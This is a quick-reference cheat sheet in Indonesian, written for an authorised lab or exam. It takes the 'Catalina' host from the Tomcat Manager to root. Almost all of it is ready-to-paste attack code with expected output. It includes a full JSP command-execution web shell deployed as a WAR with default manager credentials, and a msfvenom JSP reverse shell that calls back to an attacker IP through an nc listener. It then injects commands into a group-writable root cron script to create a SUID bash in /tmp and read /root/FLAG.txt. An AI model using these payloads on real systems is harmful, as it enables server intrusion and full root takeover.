# Catalina Close Book — Tomcat Manager to Root FLAG

> Untuk ujian/lab berizin.  
> Fokus: cepat sampai root, lalu cari lokasi flag.  
> Tidak memakai backup, tidak proof terpisah, tidak cleanup.

---

## Data Hafalan

```text
TARGET       = 192.168.56.122
WEB          = http://192.168.56.122:8081
ATTACKER_IP  = 192.168.56.116
Credential   = tomcat:s3cret
Cron root     = /etc/cron.d/backup
Script vuln   = /opt/backup/backup.sh
Root shell    = /tmp/rootbash -p
Cari flag     = find / -type f -iname "*flag*" 2>/dev/null
Flag terbukti = /root/FLAG.txt
```

Inti celah:

```text
root menjalankan /opt/backup/backup.sh setiap menit
backup.sh writable oleh group tomcat
shell kita adalah tomcat
payload di backup.sh dijalankan root
setelah root, cari dulu file flag dengan find
```

---

# Opsi 1 — JSP Manual Tanpa Reverse Shell

Pilih ini kalau ingin paling stabil dan tidak bergantung pada callback reverse shell.

## 1. Set target

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"
```

## 2. Buat JSP command runner

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();
    byte[] b = new byte[4096];
    int n;
    out.println("<pre>");
    while ((n = in.read(b)) != -1) out.write(new String(b,0,n));
    while ((n = err.read(b)) != -1) out.write(new String(b,0,n));
    out.println("</pre>");
}
%>
EOF

zip -r labcmd.war cmd.jsp
```

## 3. Deploy WAR

```bash
curl -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$WEB/manager/text/deploy?path=/labcmd&update=true"
```

Expected:

```text
OK - Deployed application at context path [/labcmd]
```

## 4. Validasi RCE

```bash
SHELL_URL="$WEB/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id; whoami; hostname" "$SHELL_URL"
```

Expected:

```text
uid=997(tomcat)
tomcat
catalina
```

## 5. Langsung tanam payload rootbash

```bash
curl -sG \
  --data-urlencode "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
sleep 70
```

## 6. Cari lokasi flag sebelum tahu nama file

```bash
curl -sG \
  --data-urlencode "cmd=/tmp/rootbash -p -c 'find / -type f -iname \"*flag*\" 2>/dev/null'" \
  "$SHELL_URL"
```

Expected pada lab Catalina:

```text
/root/FLAG.txt
```

## 7. Baca flag dari path yang ditemukan

```bash
curl -sG \
  --data-urlencode "cmd=/tmp/rootbash -p -c 'whoami; cat /root/FLAG.txt'" \
  "$SHELL_URL"
```

Expected:

```text
root
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

# Opsi 2 — msfvenom Reverse Shell

Pilih ini kalau ingin shell interaktif.

## 1. Set target

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"
```

## 2. Buat WAR reverse shell

```bash
mkdir -p ~/tomcat-lab/msfvenom
cd ~/tomcat-lab/msfvenom

msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$ATTACKER_IP" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

## 3. Deploy WAR

```bash
curl -u tomcat:s3cret \
  --upload-file catalina-shell.war \
  "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
```

## 4. Buka listener

```bash
nc -lvnp 4444
```

## 5. Trigger shell

Buka terminal lain:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Kalau shell belum masuk:

```bash
unzip -l catalina-shell.war | grep jsp
curl -s "$WEB/catalina-shell/NAMA_FILE.jsp" >/dev/null
```

## 6. Setelah shell masuk

Di terminal `nc`:

```bash
id
whoami
hostname
```

Expected:

```text
uid=997(tomcat)
tomcat
catalina
```

## 7. Langsung buat rootbash

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
```

## 8. Masuk root

```bash
/tmp/rootbash -p
whoami
id
```

Expected:

```text
root
euid=0(root)
```

## 9. Cari lokasi flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

Expected pada lab Catalina:

```text
/root/FLAG.txt
```

## 10. Baca flag dari path yang ditemukan

```bash
cat /root/FLAG.txt
```

Expected:

```text
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

# Cheat Sheet Paling Pendek

## JSP Manual

```bash
WEB="http://192.168.56.122:8081"
mkdir -p ~/tomcat-lab/labcmd && cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %><% String c=request.getParameter("cmd"); if(c!=null){String[] x={"/bin/sh","-c",c}; Process p=Runtime.getRuntime().exec(x); InputStream i=p.getInputStream(),e=p.getErrorStream(); byte[] b=new byte[4096]; int n; out.println("<pre>"); while((n=i.read(b))!=-1)out.write(new String(b,0,n)); while((n=e.read(b))!=-1)out.write(new String(b,0,n)); out.println("</pre>"); } %>
EOF

zip -r labcmd.war cmd.jsp
curl -u tomcat:s3cret --upload-file labcmd.war "$WEB/manager/text/deploy?path=/labcmd&update=true"

SHELL_URL="$WEB/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id;whoami;hostname" "$SHELL_URL"

curl -sG --data-urlencode "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" "$SHELL_URL"
sleep 70
curl -sG --data-urlencode "cmd=/tmp/rootbash -p -c 'find / -type f -iname \"*flag*\" 2>/dev/null'" "$SHELL_URL"
curl -sG --data-urlencode "cmd=/tmp/rootbash -p -c 'whoami; cat /root/FLAG.txt'" "$SHELL_URL"
```

## msfvenom

Terminal 1:

```bash
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom && cd ~/tomcat-lab/msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT="$LPORT" -f war -o catalina-shell.war
curl -u tomcat:s3cret --upload-file catalina-shell.war "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
nc -lvnp 4444
```

Terminal 2:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Setelah shell masuk di Terminal 1:

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
/tmp/rootbash -p
find / -type f -iname "*flag*" 2>/dev/null
cat /root/FLAG.txt
```
